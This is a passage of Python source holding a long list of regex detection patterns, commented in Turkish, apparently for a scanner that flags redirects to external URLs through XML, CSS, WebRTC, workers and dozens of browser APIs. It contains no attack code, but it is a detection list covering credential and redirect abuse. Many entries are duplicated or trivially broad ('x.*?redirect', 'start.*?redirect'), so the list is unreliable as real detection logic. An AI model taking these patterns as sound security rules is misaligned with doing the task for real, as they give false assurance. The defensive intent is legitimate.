        {"desen": r"redirect.*?vbscript:.*?navigate.*?https?://", "guven": 0.9, "aciklama": "VBScript URL navigate"},
        
        # XML/XSLT redirects
        {"desen": r"<xsl:.*?redirect.*?https?://", "guven": 0.85, "aciklama": "XSLT redirect dış URL"},
        {"desen": r"<?xml.*?redirect.*?https?://", "guven": 0.8, "aciklama": "XML redirect dış URL"},
        {"desen": r"<!ENTITY.*?redirect.*?https?://", "guven": 0.85, "aciklama": "XML entity redirect"},
        {"desen": r"<redirect[^>]*>.*?https?://", "guven": 0.85, "aciklama": "XML redirect element"},
        {"desen": r"<location[^>]*>.*?https?://", "guven": 0.8, "aciklama": "XML location element"},
        
        # CSS redirects
        {"desen": r"@import.*?url\(.*?https?://", "guven": 0.75, "aciklama": "CSS import dış URL"},
        {"desen": r"background-image:.*?url\(.*?https?://", "guven": 0.7, "aciklama": "CSS background dış URL"},
        {"desen": r"content:.*?url\(.*?https?://", "guven": 0.75, "aciklama": "CSS content dış URL"},
        {"desen": r"cursor:.*?url\(.*?https?://", "guven": 0.7, "aciklama": "CSS cursor dış URL"},
        {"desen": r"list-style-image:.*?url\(.*?https?://", "guven": 0.7, "aciklama": "CSS list-style dış URL"},
        
        # WebRTC redirects
        {"desen": r"RTCPeerConnection.*?https?://", "guven": 0.8, "aciklama": "WebRTC peer connection dış URL"},
        {"desen": r"createOffer.*?https?://", "guven": 0.75, "aciklama": "WebRTC create offer dış URL"},
        {"desen": r"setRemoteDescription.*?https?://", "guven": 0.8, "aciklama": "WebRTC remote description dış URL"},
        {"desen": r"addIceCandidate.*?https?://", "guven": 0.8, "aciklama": "WebRTC ICE candidate dış URL"},
        {"desen": r"iceServers.*?https?://", "guven": 0.85, "aciklama": "WebRTC ICE servers dış URL"},
        
        # Service Worker redirects
        {"desen": r"navigator\.serviceWorker.*?https?://", "guven": 0.8, "aciklama": "Service Worker dış URL"},
        {"desen": r"self\.registration.*?https?://", "guven": 0.8, "aciklama": "Service Worker registration dış URL"},
        {"desen": r"fetch.*?respondWith.*?https?://", "guven": 0.85, "aciklama": "Service Worker fetch redirect"},
        {"desen": r"caches\.open.*?https?://", "guven": 0.75, "aciklama": "Service Worker cache dış URL"},
        {"desen": r"importScripts.*?https?://", "guven": 0.85, "aciklama": "Service Worker import dış URL"},
        
        # Web Worker redirects
        {"desen": r"new Worker\s*\(\s*['\"]https?://", "guven": 0.85, "aciklama": "Web Worker dış URL"},
        {"desen": r"SharedWorker\s*\(\s*['\"]https?://", "guven": 0.85, "aciklama": "Shared Worker dış URL"},
        {"desen": r"postMessage.*?https?://", "guven": 0.75, "aciklama": "Worker postMessage dış URL"},
        {"desen": r"onmessage.*?https?://", "guven": 0.75, "aciklama": "Worker onmessage dış URL"},
        {"desen": r"terminate.*?https?://", "guven": 0.7, "aciklama": "Worker terminate dış URL"},
        
        # Manifest redirects
        {"desen": r"<link[^>]*manifest.*?https?://", "guven": 0.8, "aciklama": "Web manifest dış URL"},
        {"desen": r"start_url.*?https?://", "guven": 0.85, "aciklama": "Manifest start_url dış URL"},
        {"desen": r"scope.*?https?://", "guven": 0.8, "aciklama": "Manifest scope dış URL"},
        {"desen": r"background\.scripts.*?https?://", "guven": 0.85, "aciklama": "Extension background script"},
        {"desen": r"content_scripts.*?https?://", "guven": 0.8, "aciklama": "Extension content script"},
        
        # PostMessage redirects
        {"desen": r"window\.postMessage.*?https?://", "guven": 0.8, "aciklama": "PostMessage dış URL"},
        {"desen": r"parent\.postMessage.*?https?://", "guven": 0.8, "aciklama": "Parent postMessage dış URL"},
        {"desen": r"top\.postMessage.*?https?://", "guven": 0.8, "aciklama": "Top postMessage dış URL"},
        {"desen": r"event\.source\.postMessage.*?https?://", "guven": 0.85, "aciklama": "Event source postMessage"},
        {"desen": r"addEventListener.*?message.*?https?://", "guven": 0.8, "aciklama": "Message listener dış URL"},
        
        # Popup redirects
        {"desen": r"window\.open\s*\(\s*['\"][^'\"]*\?.*?redirect=https?://", "guven": 0.9, "aciklama": "Popup redirect parametresi"},
        {"desen": r"showModalDialog.*?https?://", "guven": 0.8, "aciklama": "Modal dialog dış URL"},
        {"desen": r"showModelessDialog.*?https?://", "guven": 0.8, "aciklama": "Modeless dialog dış URL"},
        {"desen": r"alert.*?https?://", "guven": 0.7, "aciklama": "Alert içinde dış URL"},
        {"desen": r"confirm.*?https?://", "guven": 0.7, "aciklama": "Confirm içinde dış URL"},
        
        # History API redirects
        {"desen": r"history\.pushState.*?https?://", "guven": 0.8, "aciklama": "History pushState dış URL"},
        {"desen": r"history\.replaceState.*?https?://", "guven": 0.8, "aciklama": "History replaceState dış URL"},
        {"desen": r"history\.go.*?https?://", "guven": 0.8, "aciklama": "History go dış URL"},
        {"desen": r"history\.back.*?https?://", "guven": 0.75, "aciklama": "History back dış URL"},
        {"desen": r"history\.forward.*?https?://", "guven": 0.75, "aciklama": "History forward dış URL"},
        
        # Storage redirects
        {"desen": r"localStorage\.setItem.*?redirect.*?https?://", "guven": 0.85, "aciklama": "LocalStorage redirect URL"},
        {"desen": r"sessionStorage\.setItem.*?redirect.*?https?://", "guven": 0.85, "aciklama": "SessionStorage redirect URL"},
        {"desen": r"localStorage\.getItem.*?redirect.*?https?://", "guven": 0.8, "aciklama": "LocalStorage get redirect"},
        {"desen": r"sessionStorage\.getItem.*?redirect.*?https?://", "guven": 0.8, "aciklama": "SessionStorage get redirect"},
        {"desen": r"indexedDB.*?redirect.*?https?://", "guven": 0.8, "aciklama": "IndexedDB redirect URL"},
        
        # WebSocket redirects
        {"desen": r"new WebSocket\s*\(\s*['\"]wss?://", "guven": 0.85, "aciklama": "WebSocket dış URL"},
        {"desen": r"WebSocket.*?url.*?wss?://", "guven": 0.85, "aciklama": "WebSocket url parametresi"},
        {"desen": r"socket\.connect.*?wss?://", "guven": 0.8, "aciklama": "Socket connect dış URL"},
        {"desen": r"io\.connect.*?https?://", "guven": 0.8, "aciklama": "Socket.io connect dış URL"},
        {"desen": r"socket\.emit.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Socket emit redirect"},
        
        # Server Sent Events
        {"desen": r"new EventSource\s*\(\s*['\"]https?://", "guven": 0.85, "aciklama": "EventSource dış URL"},
        {"desen": r"EventSource.*?url.*?https?://", "guven": 0.85, "aciklama": "EventSource url parametresi"},
        {"desen": r"evtSource\.url.*?https?://", "guven": 0.8, "aciklama": "EventSource url property"},
        {"desen": r"onmessage.*?redirect.*?https?://", "guven": 0.85, "aciklama": "SSE message redirect"},
        {"desen": r"onerror.*?redirect.*?https?://", "guven": 0.8, "aciklama": "SSE error redirect"},
        
        # Notification API
        {"desen": r"new Notification.*?https?://", "guven": 0.8, "aciklama": "Notification API dış URL"},
        {"desen": r"Notification\.requestPermission.*?https?://", "guven": 0.75, "aciklama": "Notification permission dış URL"},
        {"desen": r"notification\.onclick.*?https?://", "guven": 0.85, "aciklama": "Notification click dış URL"},
        {"desen": r"showNotification.*?https?://", "guven": 0.8, "aciklama": "Show notification dış URL"},
        {"desen": r"registration\.showNotification.*?https?://", "guven": 0.8, "aciklama": "SW notification dış URL"},
        
        # Geolocation redirects
        {"desen": r"navigator\.geolocation.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Geolocation redirect"},
        {"desen": r"getCurrentPosition.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Current position redirect"},
        {"desen": r"watchPosition.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Watch position redirect"},
        {"desen": r"coords\.latitude.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Coordinates redirect"},
        {"desen": r"position\.coords.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Position coords redirect"},
        
        # Media API redirects
        {"desen": r"getUserMedia.*?redirect.*?https?://", "guven": 0.8, "aciklama": "GetUserMedia redirect"},
        {"desen": r"navigator\.mediaDevices.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Media devices redirect"},
        {"desen": r"MediaRecorder.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Media recorder redirect"},
        {"desen": r"createObjectURL.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Object URL redirect"},
        {"desen": r"revokeObjectURL.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Revoke object URL redirect"},
        
        # Battery API redirects
        {"desen": r"navigator\.battery.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Battery API redirect"},
        {"desen": r"getBattery.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Get battery redirect"},
        {"desen": r"battery\.level.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Battery level redirect"},
        {"desen": r"onchargingchange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Battery charging redirect"},
        {"desen": r"ondischargingtimechange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Battery discharging redirect"},
        
        # Clipboard API redirects
        {"desen": r"navigator\.clipboard.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Clipboard API redirect"},
        {"desen": r"writeText.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Clipboard writeText redirect"},
        {"desen": r"readText.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Clipboard readText redirect"},
        {"desen": r"execCommand.*?copy.*?redirect.*?https?://", "guven": 0.85, "aciklama": "ExecCommand copy redirect"},
        {"desen": r"document\.execCommand.*?paste.*?redirect.*?https?://", "guven": 0.85, "aciklama": "ExecCommand paste redirect"},
        
        # Payment API redirects
        {"desen": r"new PaymentRequest.*?https?://", "guven": 0.85, "aciklama": "Payment request dış URL"},
        {"desen": r"PaymentRequest.*?show.*?https?://", "guven": 0.85, "aciklama": "Payment show dış URL"},
        {"desen": r"paymentMethod.*?https?://", "guven": 0.8, "aciklama": "Payment method dış URL"},
        {"desen": r"supportedMethods.*?https?://", "guven": 0.8, "aciklama": "Supported methods dış URL"},
        {"desen": r"complete.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Payment complete redirect"},
        
        # Credential Management API
        {"desen": r"navigator\.credentials.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Credentials API redirect"},
        {"desen": r"credentials\.create.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Credentials create redirect"},
        {"desen": r"credentials\.get.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Credentials get redirect"},
        {"desen": r"credentials\.store.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Credentials store redirect"},
        {"desen": r"PasswordCredential.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Password credential redirect"},
        
        # Background Sync API
        {"desen": r"registration\.sync.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Background sync redirect"},
        {"desen": r"sync\.register.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Sync register redirect"},
        {"desen": r"onsync.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Sync event redirect"},
        {"desen": r"syncManager.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Sync manager redirect"},
        {"desen": r"backgroundSync.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Background sync redirect"},
        
        # Push API redirects
        {"desen": r"registration\.pushManager.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Push manager redirect"},
        {"desen": r"pushManager\.subscribe.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Push subscribe redirect"},
        {"desen": r"onpush.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Push event redirect"},
        {"desen": r"pushSubscription.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Push subscription redirect"},
        {"desen": r"showNotification.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Push notification redirect"},
        
        # Intersection Observer API
        {"desen": r"IntersectionObserver.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Intersection observer redirect"},
        {"desen": r"observe.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Observer redirect"},
        {"desen": r"unobserve.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Unobserve redirect"},
        {"desen": r"intersectionRatio.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Intersection ratio redirect"},
        {"desen": r"isIntersecting.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Is intersecting redirect"},
        
        # Mutation Observer API
        {"desen": r"MutationObserver.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Mutation observer redirect"},
        {"desen": r"mutations.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Mutations redirect"},
        {"desen": r"addedNodes.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Added nodes redirect"},
        {"desen": r"removedNodes.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Removed nodes redirect"},
        {"desen": r"attributeName.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Attribute name redirect"},
        
        # Performance API redirects
        {"desen": r"performance\.mark.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Performance mark redirect"},
        {"desen": r"performance\.measure.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Performance measure redirect"},
        {"desen": r"performance\.now.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Performance now redirect"},
        {"desen": r"getEntries.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Performance entries redirect"},
        {"desen": r"navigation\.type.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Navigation type redirect"},
        
        # Resize Observer API
        {"desen": r"ResizeObserver.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Resize observer redirect"},
        {"desen": r"contentRect.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Content rect redirect"},
        {"desen": r"borderBoxSize.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Border box size redirect"},
        {"desen": r"contentBoxSize.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Content box size redirect"},
        {"desen": r"devicePixelContentBoxSize.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Device pixel box redirect"},
        
        # Web Locks API
        {"desen": r"navigator\.locks.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Web locks redirect"},
        {"desen": r"locks\.request.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Lock request redirect"},
        {"desen": r"locks\.query.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Lock query redirect"},
        {"desen": r"LockManager.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Lock manager redirect"},
        {"desen": r"held.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Lock held redirect"},
        
        # Wake Lock API
        {"desen": r"navigator\.wakeLock.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Wake lock redirect"},
        {"desen": r"wakeLock\.request.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Wake lock request redirect"},
        {"desen": r"WakeLockSentinel.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Wake lock sentinel redirect"},
        {"desen": r"release.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Wake lock release redirect"},
        {"desen": r"onrelease.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Wake lock on release redirect"},
        
        # Broadcast Channel API
        {"desen": r"new BroadcastChannel.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Broadcast channel redirect"},
        {"desen": r"postMessage.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Broadcast post message redirect"},
        {"desen": r"onmessage.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Broadcast on message redirect"},
        {"desen": r"close.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Broadcast close redirect"},
        {"desen": r"channel\.name.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Broadcast channel name redirect"},
        
        # File System Access API
        {"desen": r"showOpenFilePicker.*?redirect.*?https?://", "guven": 0.85, "aciklama": "File picker redirect"},
        {"desen": r"showSaveFilePicker.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Save picker redirect"},
        {"desen": r"showDirectoryPicker.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Directory picker redirect"},
        {"desen": r"FileSystemHandle.*?redirect.*?https?://", "guven": 0.8, "aciklama": "File system handle redirect"},
        {"desen": r"getFile.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Get file redirect"},
        
        # Contact Picker API
        {"desen": r"navigator\.contacts.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Contacts API redirect"},
        {"desen": r"contacts\.select.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Contact select redirect"},
        {"desen": r"getProperties.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Contact properties redirect"},
        {"desen": r"ContactsManager.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Contacts manager redirect"},
        {"desen": r"supportedProperties.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Supported properties redirect"},
        
        # Eye Dropper API
        {"desen": r"new EyeDropper.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Eye dropper redirect"},
        {"desen": r"eyeDropper\.open.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Eye dropper open redirect"},
        {"desen": r"sRGBHex.*?redirect.*?https?://", "guven": 0.8, "aciklama": "sRGB hex redirect"},
        {"desen": r"colorValue.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Color value redirect"},
        {"desen": r"EyeDropperResult.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Eye dropper result redirect"},
        
        # Idle Detection API
        {"desen": r"IdleDetector.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Idle detector redirect"},
        {"desen": r"requestPermission.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Idle permission redirect"},
        {"desen": r"start.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Idle start redirect"},
        {"desen": r"userState.*?redirect.*?https?://", "guven": 0.8, "aciklama": "User state redirect"},
        {"desen": r"screenState.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Screen state redirect"},
        
        # Keyboard API
        {"desen": r"navigator\.keyboard.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Keyboard API redirect"},
        {"desen": r"keyboard\.lock.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Keyboard lock redirect"},
        {"desen": r"keyboard\.unlock.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Keyboard unlock redirect"},
        {"desen": r"getLayoutMap.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Keyboard layout redirect"},
        {"desen": r"KeyboardLayoutMap.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Keyboard layout map redirect"},
        
        # Presentation API
        {"desen": r"navigator\.presentation.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Presentation API redirect"},
        {"desen": r"presentation\.request.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Presentation request redirect"},
        {"desen": r"PresentationRequest.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Presentation request redirect"},
        {"desen": r"start.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Presentation start redirect"},
        {"desen": r"reconnect.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Presentation reconnect redirect"},
        
        # Screen Capture API
        {"desen": r"getDisplayMedia.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Display media redirect"},
        {"desen": r"navigator\.mediaDevices\.getDisplayMedia.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Get display media redirect"},
        {"desen": r"captureStream.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Capture stream redirect"},
        {"desen": r"getVideoTracks.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Video tracks redirect"},
        {"desen": r"getAudioTracks.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Audio tracks redirect"},
        
        # Serial API
        {"desen": r"navigator\.serial.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Serial API redirect"},
        {"desen": r"serial\.requestPort.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Serial request port redirect"},
        {"desen": r"port\.open.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Serial port open redirect"},
        {"desen": r"readable.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Serial readable redirect"},
        {"desen": r"writable.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Serial writable redirect"},
        
        # USB API
        {"desen": r"navigator\.usb.*?redirect.*?https?://", "guven": 0.8, "aciklama": "USB API redirect"},
        {"desen": r"usb\.requestDevice.*?redirect.*?https?://", "guven": 0.85, "aciklama": "USB request device redirect"},
        {"desen": r"device\.open.*?redirect.*?https?://", "guven": 0.85, "aciklama": "USB device open redirect"},
        {"desen": r"selectConfiguration.*?redirect.*?https?://", "guven": 0.8, "aciklama": "USB select config redirect"},
        {"desen": r"claimInterface.*?redirect.*?https?://", "guven": 0.8, "aciklama": "USB claim interface redirect"},
        
        # HID API
        {"desen": r"navigator\.hid.*?redirect.*?https?://", "guven": 0.8, "aciklama": "HID API redirect"},
        {"desen": r"hid\.requestDevice.*?redirect.*?https?://", "guven": 0.85, "aciklama": "HID request device redirect"},
        {"desen": r"device\.open.*?redirect.*?https?://", "guven": 0.85, "aciklama": "HID device open redirect"},
        {"desen": r"sendReport.*?redirect.*?https?://", "guven": 0.8, "aciklama": "HID send report redirect"},
        {"desen": r"receiveReport.*?redirect.*?https?://", "guven": 0.8, "aciklama": "HID receive report redirect"},
        
        # Bluetooth API
        {"desen": r"navigator\.bluetooth.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Bluetooth API redirect"},
        {"desen": r"bluetooth\.requestDevice.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Bluetooth request device redirect"},
        {"desen": r"device\.gatt\.connect.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Bluetooth GATT connect redirect"},
        {"desen": r"getPrimaryService.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Bluetooth primary service redirect"},
        {"desen": r"getCharacteristic.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Bluetooth characteristic redirect"},
        
        # NFC API
        {"desen": r"navigator\.nfc.*?redirect.*?https?://", "guven": 0.8, "aciklama": "NFC API redirect"},
        {"desen": r"nfc\.scan.*?redirect.*?https?://", "guven": 0.85, "aciklama": "NFC scan redirect"},
        {"desen": r"ndef\.writeText.*?redirect.*?https?://", "guven": 0.85, "aciklama": "NDEF write text redirect"},
        {"desen": r"ndef\.readText.*?redirect.*?https?://", "guven": 0.85, "aciklama": "NDEF read text redirect"},
        {"desen": r"NFCReader.*?redirect.*?https?://", "guven": 0.8, "aciklama": "NFC reader redirect"},
        
        # Gamepad API
        {"desen": r"navigator\.getGamepads.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Gamepad API redirect"},
        {"desen": r"gamepad\.buttons.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Gamepad buttons redirect"},
        {"desen": r"gamepad\.axes.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Gamepad axes redirect"},
        {"desen": r"ongamepadconnected.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Gamepad connected redirect"},
        {"desen": r"ongamepaddisconnected.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Gamepad disconnected redirect"},
        
        # Ambient Light API
        {"desen": r"AmbientLightSensor.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Ambient light sensor redirect"},
        {"desen": r"illuminance.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Illuminance redirect"},
        {"desen": r"onreading.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Sensor reading redirect"},
        {"desen": r"start.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Sensor start redirect"},
        {"desen": r"stop.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Sensor stop redirect"},
        
        # Proximity API
        {"desen": r"ProximitySensor.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Proximity sensor redirect"},
        {"desen": r"distance.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Distance redirect"},
        {"desen": r"max.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Max distance redirect"},
        {"desen": r"near.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Near proximity redirect"},
        {"desen": r"onchange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Proximity change redirect"},
        
        # Accelerometer API
        {"desen": r"Accelerometer.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Accelerometer redirect"},
        {"desen": r"LinearAccelerationSensor.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Linear acceleration redirect"},
        {"desen": r"GravitySensor.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Gravity sensor redirect"},
        {"desen": r"x.*?redirect.*?https?://", "guven": 0.75, "aciklama": "X axis redirect"},
        {"desen": r"y.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Y axis redirect"},
        
        # Gyroscope API
        {"desen": r"Gyroscope.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Gyroscope redirect"},
        {"desen": r"angularVelocityX.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Angular velocity X redirect"},
        {"desen": r"angularVelocityY.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Angular velocity Y redirect"},
        {"desen": r"angularVelocityZ.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Angular velocity Z redirect"},
        {"desen": r"frequency.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Gyroscope frequency redirect"},
        
        # Magnetometer API
        {"desen": r"Magnetometer.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Magnetometer redirect"},
        {"desen": r"UncalibratedMagnetometer.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Uncalibrated magnetometer redirect"},
        {"desen": r"magneticFieldX.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Magnetic field X redirect"},
        {"desen": r"magneticFieldY.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Magnetic field Y redirect"},
        {"desen": r"magneticFieldZ.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Magnetic field Z redirect"},
        
        # Orientation API
        {"desen": r"AbsoluteOrientationSensor.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Absolute orientation redirect"},
        {"desen": r"RelativeOrientationSensor.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Relative orientation redirect"},
        {"desen": r"quaternion.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Quaternion redirect"},
        {"desen": r"populateMatrix.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Populate matrix redirect"},
        {"desen": r"rotationMatrix.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Rotation matrix redirect"},
        
        # Device Memory API
        {"desen": r"navigator\.deviceMemory.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Device memory redirect"},
        {"desen": r"memory.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Memory redirect"},
        {"desen": r"totalJSHeapSize.*?redirect.*?https?://", "guven": 0.8, "aciklama": "JS heap size redirect"},
        {"desen": r"usedJSHeapSize.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Used JS heap redirect"},
        {"desen": r"jsHeapSizeLimit.*?redirect.*?https?://", "guven": 0.8, "aciklama": "JS heap limit redirect"},
        
        # Network Information API
        {"desen": r"navigator\.connection.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Connection API redirect"},
        {"desen": r"connection\.effectiveType.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Effective type redirect"},
        {"desen": r"connection\.downlink.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Downlink redirect"},
        {"desen": r"connection\.rtt.*?redirect.*?https?://", "guven": 0.8, "aciklama": "RTT redirect"},
        {"desen": r"onchange.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Connection change redirect"},
        
        # Share API
        {"desen": r"navigator\.share.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Share API redirect"},
        {"desen": r"share.*?url.*?https?://", "guven": 0.9, "aciklama": "Share URL redirect"},
        {"desen": r"canShare.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Can share redirect"},
        {"desen": r"shareData.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Share data redirect"},
        {"desen": r"title.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Share title redirect"},
        
        # Badging API
        {"desen": r"navigator\.setAppBadge.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Set app badge redirect"},
        {"desen": r"navigator\.clearAppBadge.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Clear app badge redirect"},
        {"desen": r"setClientBadge.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Set client badge redirect"},
        {"desen": r"badge.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Badge redirect"},
        {"desen": r"unread.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Unread badge redirect"},
        
        # Periodic Background Sync
        {"desen": r"periodicSync\.register.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Periodic sync redirect"},
        {"desen": r"onperiodicsync.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Periodic sync event redirect"},
        {"desen": r"minInterval.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Min interval redirect"},
        {"desen": r"getTags.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Get tags redirect"},
        {"desen": r"unregister.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Unregister sync redirect"},
        
        # Content Index API
        {"desen": r"registration\.index.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Content index redirect"},
        {"desen": r"index\.add.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Index add redirect"},
        {"desen": r"index\.delete.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Index delete redirect"},
        {"desen": r"getAll.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Index get all redirect"},
        {"desen": r"launchUrl.*?redirect.*?https?://", "guven": 0.9, "aciklama": "Launch URL redirect"},
        
        # Font Access API
        {"desen": r"navigator\.fonts.*?redirect.*?https?://", "guven": 0.75, "aciklama": "Font access redirect"},
